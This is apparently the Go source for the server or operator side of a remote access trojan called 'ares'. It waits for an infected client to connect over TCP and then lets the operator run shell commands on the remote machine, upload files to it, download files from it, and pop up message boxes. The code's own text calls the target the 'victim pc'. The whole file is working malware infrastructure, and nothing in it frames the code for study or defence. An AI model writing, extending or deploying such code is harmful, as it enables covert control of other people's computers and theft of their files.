package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
)

func listener() {
	fmt.Printf("Enter help or ? to show commands\n")

	address := "0.0.0.0:27015"

	for {
		fmt.Printf("terminal > ")
		readselection := bufio.NewScanner(os.Stdin)
		readselection.Scan()
		selection := readselection.Text()

		if selection == "?" || selection == "help" {
			fmt.Printf("  usage:\n")
			fmt.Printf("               setup is NOT necessary!\n")
			fmt.Printf("               run start without setup to use default settings\n")
			fmt.Printf("               defaults:\n")
			fmt.Printf("                           IP  : 0.0.0.0\n")
			fmt.Printf("                           PORT: 27015\n")
			fmt.Printf("  commands:\n")
			fmt.Printf("               setup   :   starts setup process.\n")
			fmt.Printf("                           listener options are selected.\n")
			fmt.Printf("               start   :   starts TCP listener with configured options.\n")
			fmt.Printf("               back    :   returns to previous menu.\n")
			fmt.Printf("  setup options:\n")
			fmt.Printf("               host    :   listening ip address.\n")
			fmt.Printf("                           default is localhost.\n")
			fmt.Printf("               port    :   listening port.\n")
			fmt.Printf("                           default is 27015.\n")
		} else if selection == "setup" {
			address = listenersetup()
			fmt.Printf("Setup complete!\n")
		} else if selection == "start" {
			startlistener(address)
			return // returns to main menu
		} else if selection == "back" {
			return // returns to main menu
		} else {
			fmt.Printf("Error, check if you made a typo.\n")
			fmt.Printf("Enter help or ? to show commands\n")
		}
	}
}

func listenersetup() string {
	var address string

	fmt.Printf("Enter a host IP address and port to listen on.\n")
	fmt.Printf("Format example: 0.0.0.0:1234\n")
	fmt.Printf("terminal > ")
	fmt.Scanln(&address)

	return address
}

func startlistener(address string) {
	var choice int

	l, err := net.Listen("tcp", address)
	if err != nil {
		fmt.Printf("- Failed to start listener\n")
		panic(err)
	}

	fmt.Printf("+ Started TCP listener on %s\n", address)
	fmt.Printf("+ Waiting for client to connect...\n")

	conn, err := l.Accept()
	if err != nil {
		fmt.Printf("- Failed to handle client connection\n")
		l.Close()
		panic(err)
	}

	fmt.Printf("+ Client connected!\n")
	fmt.Printf("  [0] Close connection\n")
	fmt.Printf("  [1] Open a shell\n")
	fmt.Printf("  [2] Upload file\n")
	fmt.Printf("  [3] Download file\n")
	fmt.Printf("  [4] Create message box popup\n")

	fmt.Printf("terminal > ")
	fmt.Scanln(&choice)

	switch choice {
	case 0:
		conn.Write([]byte("CLOSE")) // telling client the server has closed the connection
		conn.Close()
		l.Close()
		return
	case 1:
		conn.Write([]byte("CMD")) // telling client which option the server has chosen
		shell(conn)
		conn.Close()
		l.Close()
		return
	case 2:
		conn.Write([]byte("FUP")) // telling client which option the server has chosen
		uploadfile(conn)
		conn.Close()
		l.Close()
		return
	case 3:
		conn.Write([]byte("FDO")) // telling client which option the server has chosen
		downloadfile(conn)
		conn.Close()
		l.Close()
		return
	case 4:
		conn.Write([]byte("MSG")) // telling client which option the server has chosen
		msgbox(conn)
		conn.Close()
		l.Close()
		return
	default:
		fmt.Printf("Invalid choice, closing connection to client.\n")
		conn.Write([]byte("CLOSE")) // telling client the server has closed the connection
		conn.Close()
		l.Close()
		return
	}
}

func shell(conn net.Conn) {
	var command string

	fmt.Printf("+ Shell session opened with client\n")
	fmt.Printf("+ Enter commands or 'q' to quit\n")
	for command != "q" {
		fmt.Printf("shell > ")
		readcmd := bufio.NewScanner(os.Stdin)
		readcmd.Scan()
		command = readcmd.Text()

		if command != "q" {
			_, err := conn.Write([]byte(command)) // sending command to server
			if err != nil {
				fmt.Printf("- Failed to send command to client\n")
				panic(err)
			}

			buf := make([]byte, 512) // buffer to store response from server

			_, err = conn.Read(buf)

			if err != nil {
				fmt.Printf("- Failed to read result from client\n")
				panic(err)
			}

			fmt.Printf("%s\n", buf)
		} else {
			conn.Write([]byte("QUIT")) // telling client to close the shell session and continue polling connection requests
		}
	}

	fmt.Printf("Shell session closed.\n")

	return
}

func uploadfile(conn net.Conn) {
	fmt.Printf("File name to upload:\n")
	fmt.Printf("file > ")
	readfilename := bufio.NewScanner(os.Stdin)
	readfilename.Scan()
	filename := readfilename.Text()

	conn.Write([]byte(filename))

	buf := make([]byte, 4096)

	buf, err := os.ReadFile(filename)

	if err != nil {
		fmt.Printf("- Failed to read file\n")
		return
	}

	conn.Write(buf)

	return
}

func downloadfile(conn net.Conn) {
	fmt.Printf("File name to download:\n")
	fmt.Printf("file > ")
	readfilename := bufio.NewScanner(os.Stdin)
	readfilename.Scan()
	filename := readfilename.Text()

	conn.Write([]byte(filename)) // sending the filename to client

	buf := make([]byte, 4096) // buffer to store returned file contents

	filename += "_downloaded"          // saving the file to a unique filename
	file, error := os.Create(filename) // creating the file

	if error != nil {
		fmt.Printf("- Error saving file\n")
		return
	}

	size, _ := conn.Read(buf) // stores the file contents in the buffer

	_, err := file.Write(buf[:size]) // saving the buffer contents into the local file

	if err != nil {
		fmt.Printf("- Error writing data to saved file\n")
		return
	}

	fmt.Printf(`+ File saved to "%s" in your current directory\n`, filename)

	return
}

func msgbox(conn net.Conn) {
	fmt.Printf("!!! WARNING !!!\n")
	fmt.Printf("Currently the message box feature can cause the client to stop running so you\n")
	fmt.Printf("may need to wait for the victim to restart their pc before you can get a new connection\n\n")
	fmt.Printf("Create message box popup on victim pc! (enter 'c' to cancel)\n")
	fmt.Printf("title > ")
	readtitle := bufio.NewScanner(os.Stdin)
	readtitle.Scan()
	title := readtitle.Text()

	if title == "c" {
		return
	}

	conn.Write([]byte(title)) // sending client the message box title

	fmt.Printf("content > ")
	readcontent := bufio.NewScanner(os.Stdin)
	readcontent.Scan()
	content := readcontent.Text()
	conn.Write([]byte(content)) // sending client the message box contents

	fmt.Printf("Message box deployed!\n")

	return
}

func main() {
	var selection int

	for selection != 2 {
		fmt.Printf("            .''\n")
		fmt.Printf("  ._.-.___.' (`\\\n")
		fmt.Printf(" //(        ( `'\n")
		fmt.Printf("'/ )\\ ).__. )    ares\n")
		fmt.Printf("' <' `\\ ._/'\\\n")
		fmt.Printf("   `   \\     \\\n")
		fmt.Printf("  [1] Listen for client connection\n")
		fmt.Printf("  [2] Exit\n")

		selecting := true
		for selecting {

			fmt.Printf("terminal > ")
			fmt.Scanln(&selection)

			switch selection {
			case 1:
				listener()
				selecting = false
			case 2:
				os.Exit(0)
			default:
				fmt.Printf("Please enter a valid integer choice.\n")
			}
		}
	}
}
